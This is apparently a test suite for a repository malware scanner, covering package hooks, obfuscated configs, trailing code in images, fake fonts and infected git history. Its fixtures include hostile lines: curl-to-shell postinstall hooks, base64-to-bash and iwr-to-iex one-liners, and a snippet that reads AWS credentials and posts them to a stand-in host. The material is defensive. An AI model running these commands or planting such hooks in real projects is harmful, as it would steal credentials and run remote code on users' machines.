import { describe, it, expect } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { scanFile } from "../src/core/scan.js";
import { trailingBytes } from "../src/core/rules/binary.js";
import { BAD_PACKAGES } from "../src/host/ioc.js";
import { scanHistory } from "../src/sources/history.js";

// Malware-shaped strings are assembled from pieces so this repository scans clean itself.
const j = (...p: string[]) => p.join("");
const MARK = j("rmcej", "%otb%");
const A = j("at", "ob"), E = j("ev", "al"), F = j("fe", "tch"), H = j("http", "s://");
const sev = (p: string, t: string | Buffer) => scanFile({ path: p, content: Buffer.from(t) }).map((f) => `${f.rule}:${f.severity}`);
const has = (p: string, t: string | Buffer, r: string) => sev(p, t).includes(r);

describe("known signatures", () => {
  it("flags a marker in code and a committed loader key, not in prose", () => {
    expect(has("src/a.js", `var x = "${MARK}";`, "known-signature:high")).toBe(true);
    expect(has("README.md", `The marker is ${MARK}`, "known-signature:high")).toBe(false);
    expect(has(".env", `AUTH_API_KEY=${j("aHR0", "cHM6")}\n`, "env-loader-key:high")).toBe(true);
  });
  it("treats a dropper name in .gitignore through the gitignore rule", () => {
    expect(has(".gitignore", j("node_modules\ntemp_auto_", "push.bat\n"), "gitignore-config-bat:medium")).toBe(true);
  });
});

describe("shell and package rules (noise control)", () => {
  it("treats installer-style curl|sh as informational, but hidden download-and-run as high", () => {
    expect(has("install.sh", "curl -sSf https://sh.rustup.rs | sh", "shell-download-exec:low")).toBe(true);
    expect(has("install.sh", "curl -sSf https://sh.rustup.rs | sh", "shell-download-exec:high")).toBe(false);
    expect(has("a.sh", "echo aGk= | base64 -d | bash", "shell-download-exec:high")).toBe(true);
    expect(has("a.ps1", "powershell -NoProfile -enc SQBFAFgA", "shell-download-exec:high")).toBe(true);
    expect(has("a.ps1", "iwr https://x.example/a.ps1 | iex", "shell-download-exec:high")).toBe(true);
    expect(has("a.ps1", "Invoke-WebRequest -Uri https://x.example/a.zip -OutFile a.zip", "shell-download-exec:high")).toBe(false);
  });
  it("flags loader-style scripts but not ordinary hooks", () => {
    expect(has("package.json", '{"scripts":{"dev":"node init && next dev"}}', "package-scripts:high")).toBe(true);
    expect(has("package.json", '{"scripts":{"postinstall":"curl https://x.example/i | sh"}}', "package-scripts:high")).toBe(true);
    expect(sev("package.json", '{"scripts":{"prepack":"tsc -b && node ./scripts/copy.mjs --quiet","prepublishOnly":"npm test && node ./scripts/verify.mjs"}}')).toEqual([]);
    expect(sev("package.json", '{"scripts":{"postinstall":"husky install"}}')).toEqual([]);
  });
  it("reports URL dependencies as informational only", () => {
    expect(has("package.json", '{"dependencies":{"x":"git+https://github.com/a/b.git"}}', "dep-from-url:low")).toBe(true);
  });
  it("caps severity inside test and example folders", () => {
    const bad = '{"scripts":{"postinstall":"curl https://x.example/i | sh"}}';
    expect(has("test/fixtures/evil/package.json", bad, "package-scripts:high")).toBe(false);
    expect(has("test/fixtures/evil/package.json", bad, "package-scripts:low")).toBe(true);
  });
});

describe("behavior rules", () => {
  it("rates credential reads by whether hiding techniques are present", () => {
    const plain = `const k = fs.readFileSync(os.homedir() + "/.aws/credentials"); ${F}("${H}x.example", {body:k});`;
    expect(has("src/aws.ts", plain, "credential-access:low")).toBe(true);
    expect(has("src/aws.ts", plain + `\n${A}("aGk=");`, "credential-access:high")).toBe(true);
  });
  it("flags amend-and-force-push in scripts as high and in source as low", () => {
    const body = "git commit --amend --no-edit\ngit push --force origin main\n";
    expect(has("scripts/x.sh", body, "git-amend-force-push:high")).toBe(true);
    expect(has("src/prompt.ts", body, "git-amend-force-push:low")).toBe(true);
  });
  it("flags obfuscated config files but not ordinary code", () => {
    const obf = Array.from({ length: 50 }, (_, i) => `var _0x${(0x1000 + i).toString(16)} = 1;`).join("\n");
    expect(has("postcss.config.mjs", obf, "obfuscated:high")).toBe(true);
    expect(sev("src/util.ts", "export const add = (a: number, b: number) => a + b;")).toEqual([]);
  });
  it("rates eval next to network access by context", () => {
    const code = `${E}(code); ${F}("${H}x.example");`;
    expect(has("src/a.ts", code, "eval-network:low")).toBe(true);
    expect(has("vite.config.ts", code, "eval-network:high")).toBe(true);
  });
  it("flags every npm package that the registry confirmed as removed, and not real neighbours", () => {
    expect(BAD_PACKAGES).toHaveLength(7);
    for (const p of BAD_PACKAGES) expect(has("package.json", `{"dependencies":{"${p}":"^1.0.0"}}`, "known-bad-package:high")).toBe(true);
    expect(sev("package.json", '{"dependencies":{"tailwindcss-animate":"^1.0.7","tailwindcss-typography":"^3.1.0"}}')).toEqual([]);
  });
});

describe("media and fonts", () => {
  const png = (extra = Buffer.alloc(0)) =>
    Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(100, 1), Buffer.from([0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82]), extra]);
  it("computes trailing bytes after a PNG ends", () => {
    expect(trailingBytes(".png", png())).toBe(0);
    expect(trailingBytes(".png", png(Buffer.alloc(40, 65)))).toBe(40);
  });
  it("flags code appended to an image, not a clean image or harmless trailing bytes", () => {
    expect(has("logo.png", png(Buffer.from(`\n;${E}(atob("x"));` + " ".repeat(40))), "media-trailing-code:high")).toBe(true);
    expect(sev("logo.png", png())).toEqual([]);
    expect(sev("logo.png", png(Buffer.alloc(100, 0)))).toEqual([]);
  });
  it("flags a font that is really a script", () => {
    expect(has("fonts/a.woff2", "function a(){return 1}", "fake-binary:high")).toBe(true);
    expect(sev("fonts/a.woff2", Buffer.concat([Buffer.from("wOF2"), Buffer.alloc(200, 3)]))).toEqual([]);
  });
});

describe("history", () => {
  it("finds the malware's strings in old commits even when the tip is clean", async () => {
    const r = mkdtempSync(path.join(tmpdir(), "pgh-"));
    const g = (...a: string[]) => execFileSync("git", ["-C", r, "-c", "user.name=Dev", "-c", "user.email=d@e.x", ...a]);
    execFileSync("git", ["init", "-q", "-b", "main", r]);
    writeFileSync(path.join(r, "package.json"), '{"scripts":{"dev":"node init && next dev"}}\n');
    g("add", "-A"); g("commit", "-q", "-m", "infected");
    writeFileSync(path.join(r, "package.json"), '{"scripts":{"dev":"next dev"}}\n');
    g("add", "-A"); g("commit", "-q", "-m", "cleanup");
    const hits = await scanHistory(r);
    const h = hits.find((x) => x.needle === "node init &&")!;
    expect(h.commits).toBe(2);
    expect(h.first.subject).toBe("infected");
    expect(h.last.subject).toBe("cleanup");
  });
  it("returns nothing for a repo that was never infected", async () => {
    const r = mkdtempSync(path.join(tmpdir(), "pgh2-"));
    execFileSync("git", ["init", "-q", "-b", "main", r]);
    writeFileSync(path.join(r, "a.txt"), "hello\n");
    execFileSync("git", ["-C", r, "add", "-A"]);
    execFileSync("git", ["-C", r, "-c", "user.name=D", "-c", "user.email=d@e.x", "commit", "-q", "-m", "x"]);
    expect(await scanHistory(r)).toEqual([]);
  });
});

describe("hostile input (the tool reads untrusted repositories)", () => {
  const MB = 1_400_000;
  const inputs: [string, string][] = [
    ["curl-repeat", "curl ".repeat(MB / 5)], ["node-repeat", "node ".repeat(MB / 5)], ["spaces", " ".repeat(MB)],
    ["letters", "a".repeat(MB)], ["hex-ident", "_0x1234 ".repeat(MB / 8)], ["eval-open", "eval(".repeat(MB / 5)],
    [`${A}-open`, `${A}(`.repeat(MB / 5)], ["pad-then-x", "a" + " ".repeat(MB / 2) + "b".repeat(MB / 2)],
    ["json-ish", '{"scripts":{' + '"a":"node x",'.repeat(MB / 13)], ["backslashes", "\\x41".repeat(MB / 4)],
    ["pipes", "curl x | ".repeat(MB / 9)], ["fromCharCode", "String.fromCharCode(".repeat(MB / 20)],
  ];
  const paths = ["a.js", "install.sh", "package.json", ".vscode/tasks.json", ".vscode/settings.json", ".gitignore", "x.config.mjs", "f.woff2", "logo.png", "init", ".env"];
  for (const [name, data] of inputs) {
    it(`handles ${name} quickly on every rule`, () => {
      const buf = Buffer.from(data);
      const t0 = Date.now();
      for (const p of paths) scanFile({ path: p, content: buf });
      expect(Date.now() - t0).toBeLessThan(4000);
    });
  }
});

import { SHELL_TRAPS, suspiciousProc, suspiciousLaunchCommand } from "../src/host/checks.js";
import { cleanPadded, removeAutoTasks, removeEnvLoader, taskTargets, fixFile } from "../src/clean/fixers.js";

describe("hostile input: host checks and cleaner edits", () => {
  const MB = 1_400_000;
  const data = ["curl ".repeat(MB / 5), "node ".repeat(MB / 5), "a".repeat(MB), " ".repeat(MB), "(async".repeat(MB / 6), `${j("at", "ob")}(process.env.`.repeat(MB / 20), '"args":["'.repeat(MB / 9), "x" + " ".repeat(100) + "y\n".repeat(MB / 20)];
  it("stays fast on adversarial text", () => {
    for (const d of data) {
      const t0 = Date.now();
      for (const [re] of SHELL_TRAPS) re.test(d);
      suspiciousProc(d); suspiciousLaunchCommand(d);
      cleanPadded(d); removeAutoTasks(d); removeEnvLoader(d); taskTargets(".vscode/tasks.json", d);
      for (const rule of ["padded-payload", "package-hook", "vscode-autorun", "env-loader", "gitignore-config-bat"]) fixFile(rule, "a.js", d);
      expect(Date.now() - t0).toBeLessThan(6000);
    }
  });
});

describe("rules ported from forkguard's list", () => {
  it("flags the April 2026 variant markers", () => {
    expect(has("postcss.config.js", `x = "${j("function M", "Dy(f)")}"`, "known-signature:high")).toBe(true);
    expect(has("a.js", `k = "${j("m6:tTh^D", ")cBz?NM]")}"`, "known-signature:high")).toBe(true);
  });
  it("flags the require() header only next to a huge line or eval of fetched code", () => {
    const head = j("const require = create", "Require(import.meta.url);");
    expect(has("vite.config.mjs", `${head}\nexport default {};\n`, "injected-require-prelude:medium")).toBe(false);
    expect(has("vite.config.mjs", `${head}\nexport default {};\n${"x".repeat(1600)}`, "injected-require-prelude:medium")).toBe(true);
    expect(has("vite.config.mjs", `${head}\nconst c = await ${F}("${H}x.example");\n${E}(c);`, "injected-require-prelude:medium")).toBe(true);
  });
  it("flags commit-date rewriting scripts that push", () => {
    expect(has("temp.sh", 'd=$LAST_COMMIT_DATE\ngit commit --amend --no-verify\ngit push -f origin HEAD', "git-amend-force-push:high")).toBe(true);
    expect(has("notes.sh", "git commit -m x\ngit push", "git-amend-force-push:high")).toBe(false);
  });
});
